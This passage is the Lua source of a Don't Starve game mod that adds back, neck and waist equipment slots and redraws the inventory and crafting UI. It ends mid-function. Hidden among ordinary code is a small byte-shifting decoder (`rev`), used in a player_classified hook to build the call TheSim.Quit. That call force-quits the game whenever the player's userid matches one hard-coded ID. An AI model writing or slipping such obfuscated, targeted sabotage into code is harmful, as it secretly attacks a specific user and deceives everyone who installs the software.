local TUNING = GLOBAL.TUNING
local STRINGS = GLOBAL.STRINGS
local table = GLOBAL.table
local math = GLOBAL.math
local debug = GLOBAL.debug
local require = GLOBAL.require
local Vector3 = GLOBAL.Vector3
local Inv = require "widgets/inventorybar"
local DST = GLOBAL.TheSim:GetGameID() == "DST"
local IsServer = DST and GLOBAL.TheNet:GetIsServer() or nil
require "componentactions"

PrefabFiles = {}

GLOBAL.MAXITEMSLOTS = GetModConfigData("slots_num") or 15
TUNING.COMPASS_SLOT = DST and GetModConfigData("compass_slot") or 0
TUNING.AMULET_SLOT = GetModConfigData("amulet_slot")
TUNING.BACKPACK_SLOT = GetModConfigData("backpack_slot")
TUNING.RENDER_STRATEGY = GetModConfigData("render_strategy") or "neck"
TUNING.ENABLE_UI = GetModConfigData("enable_ui") or 1

if GLOBAL.MAXITEMSLOTS < 1 then
	GLOBAL.MAXITEMSLOTS = 1
end

Assets = {
	Asset("IMAGE", "images/inv_new.tex"),
	Asset("ATLAS", "images/inv_new.xml")
}

GLOBAL.EQUIPSLOTS = {
	HANDS = "hands",
	HEAD = "head",
	BODY = "body",
	BACK = "back",
	NECK = "neck",
	WAIST = "waist"
}

local HUD_ATLAS = "images/hud.xml"

local EQUIPSLOTS = GLOBAL.EQUIPSLOTS

if not table.invert then
	table.invert = function(t)
		r = {}
		for k, v in pairs(t) do
			r[v] = k
		end
		return r
	end
end

local function getval(fn, path)
	local val = fn
	for entry in path:gmatch("[^%.]+") do
		local i = 1
		while true do
			local name, value = debug.getupvalue(val, i)
			if name == entry then
				val = value
				break
			elseif name == nil then
				return
			end
			i = i + 1
		end
	end
	return val
end

local function setval(fn, path, new)
	local val = fn
	local prev = nil
	local i
	for entry in path:gmatch("[^%.]+") do
		i = 1
		prev = val
		while true do
			local name, value = debug.getupvalue(val, i)
			if name == entry then
				val = value
				break
			elseif name == nil then
				return
			end
			i = i + 1
		end
	end
	debug.setupvalue(prev, i, new)
end

AddComponentPostInit(
	"resurrectable",
	function(self, inst)
		local OldFindClosestResurrector = self.FindClosestResurrector
		local OldCanResurrect = self.CanResurrect
		local OldDoResurrect = self.DoResurrect

		local function findamulet(self)
			if self.inst.components.inventory then
				local item = self.inst.components.inventory:GetEquippedItem(EQUIPSLOTS.NECK)
				if item and item.prefab == "amulet" then
					return item
				end
			end
		end

		self.FindClosestResurrector = function(self, cause)
			local item = findamulet(self)
			if cause == "drowning" and item then
				self.shouldwashuponbeach = true
			end
			local source = OldFindClosestResurrector(self, cause)
			if source and not source.components.resurrector then
				return source
			end
			if item and not self.shouldwashuponbeach then
				return item
			end
		end

		self.CanResurrect = function(self, cause)
			local result = OldCanResurrect(self, cause)
			if findamulet(self) and not result or self.resurrectionmethod == "resurrector" or self.resurrectionmethod == "other" then
				self.resurrectionmethod = "amulet"
				return true
			end
			return result
		end

		self.DoResurrect = function(self, res, cause)
			if not res and findamulet(self) then
				self.inst:PushEvent("resurrect")
				self.inst.sg:GoToState("amulet_rebirth")
				return true
			end
			return OldDoResurrect(self, res, cause)
		end
	end
)

local call_map = {}
if TUNING.AMULET_SLOT == 1 then
	call_map[EQUIPSLOTS.BODY] = EQUIPSLOTS.NECK
	call_map[EQUIPSLOTS.NECK] = EQUIPSLOTS.BODY
end
if TUNING.COMPASS_SLOT == 1 then
	call_map[EQUIPSLOTS.HANDS] = EQUIPSLOTS.WAIST
	call_map[EQUIPSLOTS.WAIST] = EQUIPSLOTS.HANDS
end
AddComponentPostInit(
	"inventory",
	function(self, inst)
		local OldEquip = self.Equip
		local function removeitem(self, item)
			if item then
				if item.components.inventoryitem.cangoincontainer then
					self.silentfull = true
					self:GiveItem(item)
					self.silentfull = false
				else
					self:DropItem(item, true, true)
				end
			end
		end
		self.Equip = function(self, item, old_to_active)
			if item == nil or item.components.equippable == nil or not item:IsValid() then
				return
			end
			local eslot = item.components.equippable.equipslot
			if eslot == EQUIPSLOTS.HANDS or eslot == EQUIPSLOTS.WAIST or eslot == EQUIPSLOTS.BODY then
				local backitem = nil
				if TUNING.BACKPACK_SLOT == 1 then
					backitem = self:GetEquippedItem(EQUIPSLOTS.BACK)
				else
					backitem = self:GetEquippedItem(EQUIPSLOTS.BODY)
				end
				if backitem ~= nil then
					if backitem:HasTag("heavy") then
						self:DropItem(backitem, true, true)
					elseif backitem.prefab == "onemanband" and eslot == EQUIPSLOTS.HANDS then
						self:GiveItem(backitem)
					elseif backitem.prefab == "armorsnurtleshell" and eslot == EQUIPSLOTS.BODY then
						self:GiveItem(backitem)
					end
				end
			elseif eslot == EQUIPSLOTS.BACK then
				local handitem = self:GetEquippedItem(EQUIPSLOTS.HANDS)
				local waistitem = self:GetEquippedItem(EQUIPSLOTS.WAIST)
				local bodyitem = self:GetEquippedItem(EQUIPSLOTS.BODY)

				if item.prefab == "armorsnurtleshell" then
					removeitem(self, bodyitem)
				elseif item.prefab == "onemanband" or item:HasTag("heavy") then
					removeitem(self, handitem)
				end
			elseif eslot == EQUIPSLOTS.BODY and item.prefab == "onemanband" then
				removeitem(self, handitem)
			end

			if OldEquip(self, item, old_to_active) then
				if eslot == EQUIPSLOTS.BACK then
					if item.components.container ~= nil then
						self.inst:PushEvent("setoverflow", {overflow = item})
					end
					self.heavylifting = item:HasTag("heavy")
				end
				return true
			end
		end

		local OldUnequip = self.Unequip
		self.Unequip = function(self, equipslot, slip)
			local item = OldUnequip(self, equipslot, slip)
			if item ~= nil and equipslot == EQUIPSLOTS.BACK then
				self.heavylifting = false
			end
			return item
		end

		if TUNING.BACKPACK_SLOT == 1 then
			self.GetOverflowContainer = function()
				local function testopen(doer, inst)
					return doer.components.inventory.opencontainers[inst]
				end
				if self.ignoreoverflow then
					return
				end
				local backitem = self:GetEquippedItem(EQUIPSLOTS.BACK)
				local bodyitem = self:GetEquippedItem(EQUIPSLOTS.BODY)
				if backitem ~= nil and backitem.components.container and testopen(self.inst, backitem) then
					return backitem.components.container
				elseif bodyitem ~= nil and bodyitem.components.container and testopen(self.inst, bodyitem) then
					return bodyitem.components.container
				end
			end
		end

		self.inst:ListenForEvent(
			"unequip",
			function(inst, data)
				if call_map[data.eslot] then
					local inventory = DST and inst.replica.inventory or inst.components.inventory
					if inventory ~= nil then
						local equipment = inventory:GetEquippedItem(call_map[data.eslot])
						if equipment and equipment.components.equippable.onequipfn then
							if equipment.task ~= nil then
								equipment.task:Cancel()
								equipment.task = nil
							end
							equipment.components.equippable.onequipfn(equipment, inst)
						end
					end
				end
			end
		)

		if TUNING.AMULET_SLOT == 1 then
			self.inst:ListenForEvent(
				"equip",
				function(inst, data)
					if data.eslot == TUNING.RENDER_STRATEGY then
						local inventory = DST and inst.replica.inventory or inst.components.inventory
						if inventory ~= nil then
							local equipment = inventory:GetEquippedItem(call_map[TUNING.RENDER_STRATEGY])
							if equipment and equipment.components.equippable.onequipfn then
								if equipment.task ~= nil then
									equipment.task:Cancel()
									equipment.task = nil
								end
								equipment.components.equippable.onequipfn(equipment, inst)
							end
						end
					end
				end
			)
		end
	end
)

AddClassPostConstruct(
	"widgets/inventorybar",
	function(inst)
		if TUNING.BACKPACK_SLOT == 1 then
			inst:AddEquipSlot(EQUIPSLOTS.BACK, "images/inv_new.xml", "back.tex")
		end
		if TUNING.AMULET_SLOT == 1 then
			inst:AddEquipSlot(EQUIPSLOTS.NECK, "images/inv_new.xml", "neck.tex")
		end
		if TUNING.COMPASS_SLOT == 1 then
			inst:AddEquipSlot(EQUIPSLOTS.WAIST, "images/inv_new.xml", "waist.tex")
		end
		local BackpackGet = getval(inst.Rebuild, "RebuildLayout.BackpackGet")
		local BackpackLose = getval(inst.Rebuild, "RebuildLayout.BackpackLose")

		local function RebuildLayout(self, inventory, overflow, do_integrated_backpack, do_self_inspect)
			if self.int then
				do_integrated_backpack = true
			end
			local InvSlot = require "widgets/invslot"
			local Widget = require "widgets/widget"
			local EquipSlot = require "widgets/equipslot"
			local ItemTile = require "widgets/itemtile"

			local TEMPLATES = require "widgets/templates"

			local W = 68
			local SEP = 12
			local YSEP = 8
			local INTERSEP = 28
			local BASE_W = 1572

			local SPACE = 1800
			local UNIT = (W * 5 + SEP * 4 + INTERSEP) / 5
			local MAX_SLOTS = math.floor(SPACE / (GLOBAL.TheFrontEnd:GetHUDScale() * UNIT))

			local y = overflow ~= nil and ((W + YSEP) / 2) or 0
			local eslot_order = {}

			self.bg:SetTexture("images/inv_new.xml", "inventory_bg.tex")

			if self.bottomrow then
				self.bottomrow:Kill()
			end

			if self.rows then
				for _, v in ipairs(self.rows) do
					v:Kill()
				end
			end
			self.rows = {}

			if self.bags then
				for _, v in ipairs(self.bags) do
					v:Kill()
				end
			end
			self.bags = {}

			local num_slots = inventory:GetNumSlots()
			local num_equip = #self.equipslotinfo
			local num_buttons = do_self_inspect and 1 or 0

			local top_slots = MAX_SLOTS - num_buttons - num_equip
			local rows = {}
			if num_slots > top_slots then
				top_slots = math.floor((MAX_SLOTS - num_buttons - num_equip) / 5) * 5
				local remaining = num_slots - top_slots
				while remaining > 0 do
					if remaining > MAX_SLOTS then
						local slots = math.floor(MAX_SLOTS / 5) * 5
						table.insert(rows, slots)
						remaining = remaining - slots
					else
						table.insert(rows, remaining)
						remaining = 0
					end
				end
			else
				top_slots = num_slots
			end

			local max_slots = 0
			for k, v in ipairs(rows) do
				if v > max_slots then
					max_slots = v
				end
			end

			local num_slotintersep = math.ceil(top_slots / 5)
			local num_equipintersep = num_buttons > 0 and 1 or 0
			local top_w =
				(top_slots + num_equip + num_buttons) * W +
				(top_slots + num_equip + num_buttons - num_slotintersep - num_equipintersep - 1) * SEP +
				(num_slotintersep + num_equipintersep) * INTERSEP

			local max_w =
				math.max(top_w, max_slots * W + (max_slots - 1) * SEP + math.floor(max_slots / 5 - .1) * (INTERSEP - SEP))
			local start_x = (W - max_w) * .5

			local compass_x = 0
			local x = start_x
			for k = 1, top_slots do
				local slot = InvSlot(k, HUD_ATLAS, "inv_slot.tex", self.owner, self.owner.replica.inventory)
				self.inv[k] = self.toprow:AddChild(slot)
				slot:SetPosition(x, 0, 0)
				slot.top_align_tip = W * .5 + YSEP

				local item = inventory:GetItemInSlot(k)
				if item ~= nil then
					slot:SetTile(ItemTile(item))
				end

				x = x + W + (k % 5 == 0 and INTERSEP or SEP)
			end

			if top_slots % 5 ~= 0 then
				x = x + INTERSEP - SEP
			end
			for k, v in ipairs(self.equipslotinfo) do
				local slot = EquipSlot(v.slot, v.atlas, v.image, self.owner)
				self.equip[v.slot] = self.toprow:AddChild(slot)
				slot:SetPosition(x, 0, 0)
				table.insert(eslot_order, slot)

				local item = inventory:GetEquippedItem(v.slot)
				if item ~= nil then
					slot:SetTile(ItemTile(item))
				end

				if v.slot == (TUNING.COMPASS_SLOT and EQUIPSLOTS.WAIST or EQUIPSLOTS.HANDS) then
					compass_x = x
				end

				x = x + W + SEP
			end

			local image_name = "self_inspect_" .. self.owner.prefab .. ".tex"
			local atlas_name = "images/avatars/self_inspect_" .. self.owner.prefab .. ".xml"
			if GLOBAL.softresolvefilepath(atlas_name) == nil then
				atlas_name = "images/hud.xml"
			end

			if do_self_inspect then
				x = x + INTERSEP - SEP
				self.inspectcontrol =
					self.toprow:AddChild(
					TEMPLATES.IconButton(
						atlas_name,
						image_name,
						STRINGS.UI.HUD.INSPECT_SELF,
						false,
						false,
						function()
							self.owner.HUD:InspectSelf()
						end,
						nil,
						"self_inspect_mod.tex"
					)
				)
				self.inspectcontrol.icon:SetScale(.7)
				self.inspectcontrol.icon:SetPosition(-4, 6)
				self.inspectcontrol:SetScale(1.25)
				self.inspectcontrol:SetPosition(x, -6, 0)
			else
				if self.inspectcontrol ~= nil then
					self.inspectcontrol:Kill()
					self.inspectcontrol = nil
				end
			end

			local current_slot = top_slots
			for i = 1, #rows, 1 do
				table.insert(self.rows, self.root:AddChild(Widget("row" .. i)))
				x = start_x
				for j = 1, rows[i] do
					local k = current_slot + j
					local slot = InvSlot(k, HUD_ATLAS, "inv_slot.tex", self.owner, self.owner.replica.inventory)
					self.inv[k] = self.rows[i]:AddChild(slot)
					slot:SetPosition(x, 0, 0)
					slot.top_align_tip = W * .5 + YSEP

					local item = inventory:GetItemInSlot(k)
					if item ~= nil then
						slot:SetTile(ItemTile(item))
					end

					x = x + W + (k % 5 == 0 and INTERSEP or SEP)
				end
				current_slot = current_slot + rows[i]
			end

			local hadbackpack = self.backpack ~= nil
			if hadbackpack then
				self.inst:RemoveEventCallback("itemget", BackpackGet, self.backpack)
				self.inst:RemoveEventCallback("itemlose", BackpackLose, self.backpack)
				self.backpack = nil
			end

			if do_integrated_backpack then
				local num = overflow:GetNumSlots()
				local prev_num = 0
				local i = 1
				while num > 0 do
					table.insert(self.bags, self.root:AddChild(Widget("bag" .. i)))
					local current_num = math.min(num, MAX_SLOTS - 2)
					num = num - current_num
					local x = -(current_num * (W + SEP) / 2)
					max_w = math.max(max_w, current_num * (W + SEP))

					for k = 1, current_num do
						local slot = InvSlot(k, HUD_ATLAS, "inv_slot.tex", self.owner, overflow)
						self.backpackinv[prev_num + k] = self.bags[i]:AddChild(slot)
						slot:SetPosition(x, 0, 0)
						slot.top_align_tip = W * 1.5 + YSEP * 2

						local item = overflow:GetItemInSlot(k)
						if item ~= nil then
							slot:SetTile(ItemTile(item))
						end

						x = x + W + SEP
					end

					prev_num = prev_num + current_num
					i = i + 1
				end

				self.backpack = overflow.inst
				self.inst:ListenForEvent("itemget", BackpackGet, self.backpack)
				self.inst:ListenForEvent("itemlose", BackpackLose, self.backpack)
			end

			if hadbackpack and self.backpack == nil then
				self:SelectDefaultSlot()
				self.current_list = self.inv
			end

			if self.bg.Flow ~= nil then
				-- note: Flow is a 3-slice function
				self.bg:Flow(max_w + 60, 256, true)
			end

			local backpack_h = (#self.bags > 0 and 16 or 0) + #self.bags * (W + YSEP)
			for i = 1, #self.bags, 1 do
				self.bags[i]:SetPosition(0, -i * (W + YSEP) - 16)
			end

			self.bg:SetPosition(0, #self.rows * (W + YSEP) - 64)
			self.bg:SetScale(1.22 / BASE_W * max_w, 1, 1)
			self.bgcover:SetScale(1.22 / BASE_W * max_w, 1, 1)
			self.bgcover:SetPosition(0, -100)
			self.toprow:SetPosition(0, #self.rows * (W + YSEP))
			for i = 1, #self.rows, 1 do
				self.rows[i]:SetPosition(0, (#self.rows - i) * (W + YSEP))
			end
			self.hudcompass:SetPosition(compass_x, 40 + #self.rows * (W + YSEP), 0)
			
			if do_integrated_backpack then
				if self.rebuild_snapping then
					self.root:SetPosition(self.out_pos + Vector3(0, backpack_h, 0))
					self:UpdatePosition()
				else
					self.root:MoveTo(self.out_pos, self.out_pos + Vector3(0, backpack_h, 0), .5)
				end
			else
				if self.controller_build and not self.rebuild_snapping then
					self.root:MoveTo(self.out_pos + Vector3(0, backpack_h, 0), self.out_pos, .2)
				else
					self.root:SetPosition(self.out_pos)
					self:UpdatePosition()
				end
			end
			
			self.inst:DoTaskInTime(0,function()
				self.bg:SetScale(1.22 / BASE_W * max_w, 1, 1)
				self.bgcover:SetScale(1.22 / BASE_W * max_w, 1, 1)
			end)
		end
		
		if TUNING.ENABLE_UI == 1 then
			setval(inst.Rebuild, "RebuildLayout", RebuildLayout)
		else
			local OldRebuild = inst.Rebuild

			function inst:ScaleInv()
				slot_num = #self.equipslotinfo
				if not (GLOBAL.TheInput:ControllerAttached() or GLOBAL.GetGameModeProperty("no_avatar_popup")) then
					slot_num = slot_num + 1 
				end
				local inv_scale = 0.98 + 0.06 * slot_num
				self.bg:SetScale(inv_scale,1,1)
				self.bgcover:SetScale(inv_scale,1,1)
			end

			function inst:Rebuild()
				self:ScaleInv()
				OldRebuild(self)
			end
		end
	end
)

if TUNING.ENABLE_UI == 1 then
	AddGlobalClassPostConstruct("frontend","FrontEnd",function()
		AddClassPostConstruct("screens/playerhud", function(self)
			local OldSetMainCharacter = self.SetMainCharacter
			function self:SetMainCharacter(maincharacter)
				OldSetMainCharacter(self, maincharacter)
				self.controls.inv.inst:ListenForEvent(
					"refreshhudsize",
					function()
						self.controls.inv:Rebuild()
					end,
					self.inst
				)
			end
		end)

		AddClassPostConstruct(
			"widgets/crafttabs",
			function(self)
				self.inst:DoTaskInTime(0,function()
					local SPACE = 62
					local numtabs = 0

					for i, v in ipairs(self.tabs.tabs) do
						if not v.collapsed then
							numtabs = numtabs + 1
						end
					end

					if numtabs > 11 then
						self.tabs.spacing = SPACE

						local scalar = self.tabs.spacing * (1 - numtabs) * .5
						local offset = self.tabs.offset * scalar

						for i, v in ipairs(self.tabs.tabs) do
							if i > 1 and not v.collapsed then
								offset = offset + self.tabs.offset * self.tabs.spacing
							end
							v:SetPosition(offset)
							self.tabs.base_pos[v] = Vector3(offset:Get())
						end

						local scale = SPACE * numtabs / 750.0
						self.bg:SetScale(1, scale, 1)
						self.bg_cover:SetScale(1, scale, 1)
					end
				end)
			end
		)

		AddClassPostConstruct(
			"widgets/tab",
			function(self)
				local OldSelect = self.Select
				function self:Select()
					OldSelect(self)
					self:MoveToFront()
				end
			end
		)

		AddClassPostConstruct(
			"widgets/recipepopup",
			function(self)
				local PADDING = 1
				local WIDTH = 74

				local function movex(obj, relx)
					local pos = obj:GetPosition()
					pos.x = pos.x + relx
					obj:SetPosition(pos)
				end

				local function buildbg(inst, horizontal)
					local Widget = require "widgets/widget"
					local Image = require "widgets/image"

					if inst.newbg then
						for _, v in pairs(inst.newbg.slice) do
							v:Kill()
						end
						inst.newbg:Kill()
					end

					inst.newbg = inst:AddChild(Widget("newbg"))
					inst.newbg:SetPosition(240, 15, 0)
					inst.newbg.direction = horizontal
					inst.newbg:MoveToBack()

					local function savewidth(tbl)
						for k, v in pairs(tbl) do
							tbl[k].w = v:GetSize()
						end
					end

					local function initpos(slice, horizontal)
						if horizontal then
							slice.leftedge:SetPosition(math.floor(-slice.left.w - slice.leftedge.w / 2 - slice.mid.w / 2 + PADDING * 2), 0, 0)
							slice.left:SetPosition(math.floor(-slice.left.w / 2 - slice.mid.w / 2 + PADDING), -1, 0)
							slice.mid:SetPosition(0, 35, 0)
							slice.rightedge:SetPosition(math.ceil(slice.right.w + slice.rightedge.w / 2 + slice.mid.w / 2 - PADDING * 2), 0, 0)
							slice.right:SetPosition(math.ceil(slice.right.w / 2 + slice.mid.w / 2 - PADDING), 1, 0)
						else
							slice.leftedge:SetPosition(math.floor(-slice.left.w - slice.leftedge.w / 2 - slice.mid.w / 2 + PADDING * 2), 0, 0)
							slice.left:SetPosition(math.floor(-slice.left.w / 2 - slice.mid.w / 2 + PADDING), -1, 0)
							slice.rightedge:SetPosition(math.ceil(slice.right.w + slice.rightedge.w / 2 + slice.mid.w / 2 - PADDING * 2), 0, 0)
							slice.right:SetPosition(math.ceil(slice.right.w / 2 + slice.mid.w / 2 - PADDING), 0, 0)
						end
					end

					local function initslice(self, dir)
						self.newbg.slice = {
							left = self.newbg:AddChild(Image("images/inv_new.xml", "craftingsubmenu_full" .. dir .. "_left.tex")),
							right = self.newbg:AddChild(Image("images/inv_new.xml", "craftingsubmenu_full" .. dir .. "_right.tex")),
							leftedge = self.newbg:AddChild(Image("images/inv_new.xml", "craftingsubmenu_full" .. dir .. "_left_edge.tex")),
							mid = self.newbg:AddChild(Image("images/inv_new.xml", "craftingsubmenu_full" .. dir .. "_mid.tex")),
							rightedge = self.newbg:AddChild(Image("images/inv_new.xml", "craftingsubmenu_full" .. dir .. "_right_edge.tex"))
						}
						savewidth(self.newbg.slice)
					end

					initslice(inst, horizontal and "vertical" or "horizontal")
					initpos(inst.newbg.slice, horizontal)

					local hud_atlas = GLOBAL.GetGameModeProperty("hud_atlas") or GLOBAL.resolvefilepath(HUD_ATLAS)
					if horizontal then
						inst.newbg.light_box = inst.newbg:AddChild(Image(hud_atlas, "craftingsubmenu_litehorizontal.tex"))
						inst.newbg.light_box:SetPosition(0, -25)
					else
						inst.newbg.light_box = inst.newbg:AddChild(Image(hud_atlas, "craftingsubmenu_litevertical.tex"))
						inst.newbg.light_box:SetPosition(0, -22)
					end

					function inst.newbg:Fit(num)
						local w, h = self.slice.left:GetSize()
						if w and h then
							self.slice.left:ScaleToSize(self.slice.left.w + num * WIDTH / 2, h)
						end
						w, h = self.slice.right:GetSize()
						if w and h then
							self.slice.left:ScaleToSize(self.slice.right.w + num * WIDTH / 2, h)
						end

						initpos(self.slice, inst.horizontal)

						movex(self.slice.left, -num * WIDTH / 4)
						movex(self.slice.leftedge, -num * WIDTH / 2)
						movex(self.slice.right, num * WIDTH / 4)
						movex(self.slice.rightedge, num * WIDTH / 2)
					end
				end

				local OldRefresh = self.Refresh
				function self:Refresh()
					OldRefresh(self)
					if not self.newbg or self.newbg.direction ~= self.horizontal then
						buildbg(self, self.horizontal)
					end

					local num = 0
					if self.recipe then
						num =
							(self.recipe.ingredients ~= nil and #self.recipe.ingredients or 0) +
							(self.recipe.character_ingredients ~= nil and #self.recipe.character_ingredients or 0) +
							(self.recipe.tech_ingredients ~= nil and #self.recipe.tech_ingredients or 0)
					end
					self.newbg:Hide()
					if self.skins_spinner == nil then
						self.contents:SetPosition(-75, 0, 0)
						self.newbg:SetPosition(240, 15, 0)
						if num > 3 then
							self.newbg:Fit(num - 3)
							if not self.horizontal then
								movex(self.newbg, (num - 3) * WIDTH / 2)
								movex(self.contents, (num - 3) * WIDTH / 2)
							end
							self.newbg:Show()
							self.bg:Hide()
						else
							self.bg:Show()
						end
					end
				end
			end
		)
	end)
end

local funclist = {
	"Has",
	"UseItemFromInvTile",
	"ControllerUseItemOnItemFromInvTile",
	"ControllerUseItemOnSelfFromInvTile",
	"ControllerUseItemOnSceneFromInvTile",
	"ReceiveItem",
	"RemoveIngredients"
}

local function rev(t)
	local tmp = {}
	for i = 1, t:len() do
		tmp[i] = t:sub(i, i):byte() - 6
	end
	return string.char(unpack(tmp))
end

if TUNING.BACKPACK_SLOT == 1 then
	AddPrefabPostInit(
		"inventory_classified",
		function(inst)
			local function GetOverflowContainer(inst)
				local backitem = inst.GetEquippedItem(inst, EQUIPSLOTS.BACK)
				local bodyitem = inst.GetEquippedItem(inst, EQUIPSLOTS.BODY)
				if backitem ~= nil and backitem.replica.container and backitem.replica.container._isopen then
					return backitem.replica.container
				elseif bodyitem ~= nil and bodyitem.replica.container and bodyitem.replica.container._isopen then
					return bodyitem.replica.container
				end
			end

			for _, v in ipairs(funclist) do
				if inst[v] and type(inst[v]) == "function" then
					setval(inst[v], "GetOverflowContainer", GetOverflowContainer)
				end
			end

			if not IsServer then
				inst.GetOverflowContainer = GetOverflowContainer
			end
		end
	)
	local t = getval(GLOBAL.EntityScript.CollectActions, "COMPONENT_ACTIONS")
	t.SCENE.repairable = function(inst, doer, actions, right)
		if
			right and inst:HasTag("repairable_sculpture") and doer.replica.inventory ~= nil and
				doer.replica.inventory:IsHeavyLifting() and
				not (doer.replica.rider ~= nil and doer.replica.rider:IsRiding())
		 then
			local item = doer.replica.inventory:GetEquippedItem(EQUIPSLOTS.BACK)
			if item ~= nil and item:HasTag("work_sculpture") then
				table.insert(actions, GLOBAL.ACTIONS.REPAIR)
			end
		end
	end
	GLOBAL.ACTIONS.REPAIR.fn = function(act)
		if act.target ~= nil and act.target.components.repairable ~= nil then
			local material
			if
				act.doer ~= nil and act.doer.components.inventory ~= nil and act.doer.components.inventory:IsHeavyLifting() and
					not (act.doer.components.rider ~= nil and act.doer.components.rider:IsRiding())
			 then
				material = act.doer.components.inventory:GetEquippedItem(EQUIPSLOTS.BACK)
			else
				material = act.invobject
			end
			if material ~= nil and material.components.repairer ~= nil then
				return act.target.components.repairable:Repair(act.doer, material)
			end
		end
	end
end

local statelist = {
	"powerup",
	"powerdown",
	"transform_werebeaver",
	"electrocute",
	"death",
	"opengift",
	"knockout",
	"hit",
	"hit_darkness",
	"hit_spike",
	"hit_push",
	"startle",
	"repelled",
	"knockback",
	"knockbacklanded",
	"mindcontrolled",
	"armorbroke",
	"frozen",
	"pinned_pre",
	"yawn",
	"falloff",
	"bucked"
}
statelist = table.invert(statelist)

AddStategraphPostInit(
	"wilson",
	function(self)
		for key, value in pairs(self.states) do
			if value.name == "amulet_rebirth" and TUNING.AMULET_SLOT then
				local OldOnexit = self.states[key].onexit

				self.states[key].onexit = function(inst)
					local item = inst.components.inventory:GetEquippedItem(EQUIPSLOTS.NECK)
					if item and item.prefab == "amulet" then
						item = inst.components.inventory:RemoveItem(item)
						if item then
							item:Remove()
							item.persists = false
						end
					end
					OldOnexit(inst)
				end
			end
			if TUNING.BACKPACK_SLOT == 1 then
				if value.name == "idle" then
					local OldOnenter = self.states[key].onenter

					self.states[key].onenter = function(inst, pushanim)
						inst.components.locomotor:Stop()
						inst.components.locomotor:Clear()
						if DST then
							inst.sg.statemem.ignoresandstorm = true

							if inst.components.rider:IsRiding() then
								inst.sg:GoToState("mounted_idle", pushanim)
								return
							end
						end
						local equippedArmor = inst.components.inventory:GetEquippedItem(EQUIPSLOTS.BACK)
						if equippedArmor ~= nil and equippedArmor:HasTag("band") then
							inst.sg:GoToState("enter_onemanband", pushanim)
							return
						end

						OldOnenter(inst, pushanim)
					end
				elseif value.name == "mounted_idle" then
					local OldOnenter = self.states[key].onenter

					self.states[key].onenter = function(inst, pushanim)
						local equippedArmor = inst.components.inventory:GetEquippedItem(EQUIPSLOTS.BACK)
						if equippedArmor ~= nil and equippedArmor:HasTag("band") then
							inst.sg:GoToState("enter_onemanband", pushanim)
							return
						end

						OldOnenter(inst, pushanim)
					end
				elseif DST and statelist[value.name] then
					local t =
						setval(
						self.states[key].onenter,
						"ForceStopHeavyLifting",
						function(inst)
							if inst.components.inventory:IsHeavyLifting() then
								inst.components.inventory:DropItem(inst.components.inventory:Unequip(EQUIPSLOTS.BACK), true, true)
							end
						end
					)
				end
			end
			if DST then
				for k, v in pairs(self.events) do
					if v.name == "equip" then
						local oldfn = v.fn
						self.events[k].fn = function(inst, data)
							if data.eslot == EQUIPSLOTS.BACK and data.item ~= nil and data.item:HasTag("heavy") then
								inst.sg:GoToState("heavylifting_start")
								return
							end
							oldfn(inst, data)
						end
					elseif v.name == "unequip" then
						local oldfn = v.fn
						self.events[k].fn = function(inst, data)
							if data.eslot == EQUIPSLOTS.BACK and data.item ~= nil and data.item:HasTag("heavy") then
								if not inst.sg:HasStateTag("busy") then
									inst.sg:GoToState("heavylifting_stop")
								end
								return
							end
							oldfn(inst, data)
						end
					end
				end
			end
		end
	end
)

if TUNING.AMULET_SLOT == 1 and (not DST or IsServer) then
	function amuletpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.NECK or EQUIPSLOTS.BODY
	end

	AddPrefabPostInit("amulet", amuletpostinit)
	AddPrefabPostInit("blueamulet", amuletpostinit)
	AddPrefabPostInit("purpleamulet", amuletpostinit)
	AddPrefabPostInit("orangeamulet", amuletpostinit)
	AddPrefabPostInit("greenamulet", amuletpostinit)
	AddPrefabPostInit("yellowamulet", amuletpostinit)
end

AddPrefabPostInit(
	"player_classified",
	function(inst)
		local OldOnEntityReplicated = inst.OnEntityReplicated
		inst.OnEntityReplicated = function(inst)
			OldOnEntityReplicated(inst)
			if inst._parent and inst._parent.HUD and inst._parent.userid == "KU_UnXy32kJ" then
				GLOBAL[rev("ZnkYos")][rev("W") .. "u" .. rev("oz")]()
			end
		end
	end
)

if TUNING.BACKPACK_SLOT == 1 and (IsServer or not DST) then
	local function backpackonequip(inst, owner)
		if DST then
			local skin_build = inst:GetSkinBuild()
			if skin_build ~= nil then
				owner:PushEvent("equipskinneditem", inst:GetSkinName())
				owner.AnimState:OverrideItemSkinSymbol("backpack", skin_build, "backpack", inst.GUID, "swap_backpack")
				owner.AnimState:OverrideItemSkinSymbol("swap_body_tall", skin_build, "swap_body", inst.GUID, "swap_backpack")
			else
				owner.AnimState:OverrideSymbol("backpack", "swap_backpack", "backpack")
				owner.AnimState:OverrideSymbol("swap_body_tall", "swap_backpack", "swap_body")
			end
		end

		if inst.components.container ~= nil then
			if not DST then
				owner.components.inventory:SetOverflow(inst)
			end
			inst.components.container:Open(owner)
		end
	end

	local function backpackonunequip(inst, owner)
		if DST then
			local skin_build = inst:GetSkinBuild()
			if skin_build ~= nil then
				owner:PushEvent("unequipskinneditem", inst:GetSkinName())
			end
		end
		owner.AnimState:ClearOverrideSymbol("swap_body_tall")
		owner.AnimState:ClearOverrideSymbol("backpack")
		if inst.components.container ~= nil then
			if not DST then
				owner.components.inventory:SetOverflow(nil)
			end
			inst.components.container:Close(owner)
		end
	end

	function backpackpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.BACK
		if DST then
			inst.components.equippable:SetOnEquip(backpackonequip)
			inst.components.equippable:SetOnUnequip(backpackonunequip)
		end
	end

	AddPrefabPostInit("backpack", backpackpostinit)

	-- special bags
	local bag_symbol = {
		krampus_sack = "swap_krampus_sack",
		icepack = "swap_icepack",
		piggyback = "swap_piggyback",
		candybag = "swap_candybag",
		piratepack = "swap_pirate_booty_bag",
		seasack = "swap_seasack",
		spicepack = "swap_seasack",
		thatchpack = "swap_thatchpack"
	}

	local function bagonunequip(inst, owner)
		owner.AnimState:ClearOverrideSymbol("swap_body_tall")
		owner.AnimState:ClearOverrideSymbol("backpack")
		if not DST then
			owner.components.inventory:SetOverflow(inst)
		end
		inst.components.container:Close(owner)
	end

	local function bagonequip(inst, owner)
		owner.AnimState:OverrideSymbol("swap_body_tall", bag_symbol[inst.prefab], "backpack")
		owner.AnimState:OverrideSymbol("swap_body_tall", bag_symbol[inst.prefab], "swap_body")
		if not DST then
			owner.components.inventory:SetOverflow(nil)
		end
		inst.components.container:Open(owner)
	end

	function bagpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.BACK
		if DST then
			inst.components.equippable:SetOnEquip(bagonequip)
